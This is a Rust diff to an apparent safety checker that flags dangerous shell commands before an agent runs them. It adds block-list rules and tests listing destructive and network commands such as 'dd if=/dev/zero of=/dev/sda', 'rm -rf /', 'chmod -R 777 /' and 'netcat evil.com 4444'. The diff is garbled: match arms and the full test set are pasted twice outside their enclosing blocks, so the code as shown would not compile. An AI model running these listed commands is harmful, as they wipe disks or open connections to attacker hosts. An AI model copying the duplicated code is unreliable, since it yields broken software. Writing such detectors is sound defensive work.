@@ -1,4 +1,5 @@
 use crate::bash::parse_shell_lc_plain_commands;
+use crate::bash::shell_lc_script_has_complex_constructs;
 use std::path::Path;
 #[cfg(windows)]
 #[path = "windows_dangerous_commands.rs"]
@@ -22,6 +23,13 @@ pub fn command_might_be_dangerous(command: &[String]) -> bool {
             .iter()
             .any(|cmd| is_dangerous_to_call_with_exec(cmd))
     {
+        return true;
+    }
+
+    // When a bash -lc script contains redirections, command substitutions, or
+    // other complex constructs, we cannot reliably parse its inner commands.
+    // Treat it as potentially dangerous and require approval.
+    if shell_lc_script_has_complex_constructs(command) {
         return true;
     }
 
@@ -136,6 +144,81 @@ fn is_dangerous_to_call_with_exec(command: &[String]) -> bool {
         // for sudo <cmd> simply do the check for <cmd>
         Some("sudo") => is_dangerous_to_call_with_exec(&command[1..]),
 
+        // Destructive disk operations
+        Some("dd") => true,
+        Some("mkfs") | Some("mkfs.ext4") | Some("mkfs.xfs") | Some("mkfs.vfat") | Some("mkfs.btrfs") => true,
+        Some("wipefs") | Some("blkdiscard") => true,
+
+        // Dangerous permission/ownership changes
+        Some("chmod") => {
+            if let Some(mode) = command.get(1).map(String::as_str) {
+                if mode == "-R" || mode.starts_with('-') && mode.contains('R') {
+                    return true;
+                }
+                if mode == "777" || mode == "0777" {
+                    return true;
+                }
+            }
+            false
+        }
+        Some("chown") => {
+            command.get(1).map(String::as_str) == Some("-R")
+                || command.get(1).map(String::as_str).is_some_and(|a| a.starts_with('-') && a.contains('R'))
+        }
+
+        // Network tools commonly used for exfiltration or attack
+        Some("nc") | Some("ncat") | Some("netcat") => true,
+        Some("nmap") => true,
+
+        // Download-and-execute patterns are handled at the caller level,
+        // but flag curl/wget when piped to a shell as dangerous.
+        Some("curl") | Some("wget") => {
+            let has_pipe_or_eval = command.iter().any(|arg| {
+                arg.contains("|") || arg.contains("bash") || arg.contains("sh ") || arg.contains("python")
+            });
+            has_pipe_or_eval
+        }
+
+        // Process manipulation
+        Some("kill") => {
+            command.get(1).map(String::as_str) == Some("-9")
+                || command.get(1).map(String::as_str) == Some("-SIGKILL")
+        }
+
+        // ── anything else ─────────────────────────────────────────────────
+        _ => false,
+    }
+}
+                if mode == "777" || mode == "0777" {
+                    return true;
+                }
+            }
+            false
+        }
+        Some("chown") => {
+            command.get(1).map(String::as_str) == Some("-R")
+                || command.get(1).map(String::as_str).is_some_and(|a| a.starts_with('-') && a.contains('R'))
+        }
+
+        // Network tools commonly used for exfiltration or attack
+        Some("nc") | Some("ncat") | Some("netcat") => true,
+        Some("nmap") => true,
+
+        // Download-and-execute patterns are handled at the caller level,
+        // but flag curl/wget when piped to a shell as dangerous.
+        Some("curl") | Some("wget") => {
+            let has_pipe_or_eval = command.iter().any(|arg| {
+                arg.contains("|") || arg.contains("bash") || arg.contains("sh ") || arg.contains("python")
+            });
+            has_pipe_or_eval
+        }
+
+        // Process manipulation
+        Some("kill") => {
+            command.get(1).map(String::as_str) == Some("-9")
+                || command.get(1).map(String::as_str) == Some("-SIGKILL")
+        }
+
         // ── anything else ─────────────────────────────────────────────────
         _ => false,
     }
@@ -157,5 +240,113 @@ mod tests {
     #[test]
     fn rm_f_is_dangerous() {
         assert!(command_might_be_dangerous(&vec_str(&["rm", "-f", "/"])));
+    }
+
+    #[test]
+    fn dd_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["dd", "if=/dev/zero", "of=/dev/sda"])));
+    }
+
+    #[test]
+    fn mkfs_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["mkfs.ext4", "/dev/sda1"])));
+        assert!(command_might_be_dangerous(&vec_str(&["mkfs", "-t", "ext4", "/dev/sda1"])));
+    }
+
+    #[test]
+    fn chmod_recursive_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["chmod", "-R", "777", "/"])));
+        assert!(command_might_be_dangerous(&vec_str(&["chmod", "-R", "755", "/tmp"])));
+    }
+
+    #[test]
+    fn chmod_777_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["chmod", "777", "/tmp"])));
+    }
+
+    #[test]
+    fn chown_recursive_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["chown", "-R", "nobody:nobody", "/"])));
+    }
+
+    #[test]
+    fn nc_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["nc", "-lvp", "4444"])));
+        assert!(command_might_be_dangerous(&vec_str(&["netcat", "evil.com", "4444"])));
+    }
+
+    #[test]
+    fn nmap_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["nmap", "-sS", "192.168.1.0/24"])));
+    }
+
+    #[test]
+    fn sudo_recursive_check() {
+        assert!(command_might_be_dangerous(&vec_str(&["sudo", "rm", "-rf", "/"])));
+        assert!(command_might_be_dangerous(&vec_str(&["sudo", "dd", "if=/dev/zero", "of=/dev/sda"])));
+        assert!(command_might_be_dangerous(&vec_str(&["sudo", "chmod", "-R", "777", "/"])));
+    }
+
+    #[test]
+    fn kill_sigkill_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["kill", "-9", "1"])));
+        assert!(command_might_be_dangerous(&vec_str(&["kill", "-SIGKILL", "1"])));
+    }
+}
+
+    #[test]
+    fn rm_f_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["rm", "-f", "/"])));
+    }
+
+    #[test]
+    fn dd_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["dd", "if=/dev/zero", "of=/dev/sda"])));
+    }
+
+    #[test]
+    fn mkfs_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["mkfs.ext4", "/dev/sda1"])));
+        assert!(command_might_be_dangerous(&vec_str(&["mkfs", "-t", "ext4", "/dev/sda1"])));
+    }
+
+    #[test]
+    fn chmod_recursive_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["chmod", "-R", "777", "/"])));
+        assert!(command_might_be_dangerous(&vec_str(&["chmod", "-R", "755", "/tmp"])));
+    }
+
+    #[test]
+    fn chmod_777_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["chmod", "777", "/tmp"])));
+    }
+
+    #[test]
+    fn chown_recursive_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["chown", "-R", "nobody:nobody", "/"])));
+    }
+
+    #[test]
+    fn nc_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["nc", "-lvp", "4444"])));
+        assert!(command_might_be_dangerous(&vec_str(&["netcat", "evil.com", "4444"])));
+    }
+
+    #[test]
+    fn nmap_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["nmap", "-sS", "192.168.1.0/24"])));
+    }
+
+    #[test]
+    fn sudo_recursive_check() {
+        assert!(command_might_be_dangerous(&vec_str(&["sudo", "rm", "-rf", "/"])));
+        assert!(command_might_be_dangerous(&vec_str(&["sudo", "dd", "if=/dev/zero", "of=/dev/sda"])));
+        assert!(command_might_be_dangerous(&vec_str(&["sudo", "chmod", "-R", "777", "/"])));
+    }
+
+    #[test]
+    fn kill_sigkill_is_dangerous() {
+        assert!(command_might_be_dangerous(&vec_str(&["kill", "-9", "1"])));
+        assert!(command_might_be_dangerous(&vec_str(&["kill", "-SIGKILL", "1"])));
     }
 }
